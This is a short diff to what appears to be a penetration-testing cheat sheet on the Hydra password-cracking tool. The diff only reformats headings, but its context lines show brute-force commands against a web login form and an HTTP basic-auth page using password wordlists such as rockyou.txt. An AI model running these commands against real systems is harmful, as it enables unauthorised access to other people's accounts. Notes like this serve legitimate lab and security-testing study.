@@ -1,4 +1,4 @@
-#Hydra
+###### Hydra
 
 Login page attack
 
@@ -10,7 +10,7 @@ hydra -l user -P wordlist.lst <FQDN/IP> http-post-form "/login:user=^USER^&^PASS
 hydra -l user -P wordlist.lst <FQDN/IP> http-post-form "/login:user=^USER^&^PASS^:S=logout.php" -f
 ```
 
-Http-Get attack
+HTTP GET Attack
 
 ```sh
 hydra -I -l bob -P /opt/rockyou.txt "http-get://10.10.6.224/protected:A=BASIC"
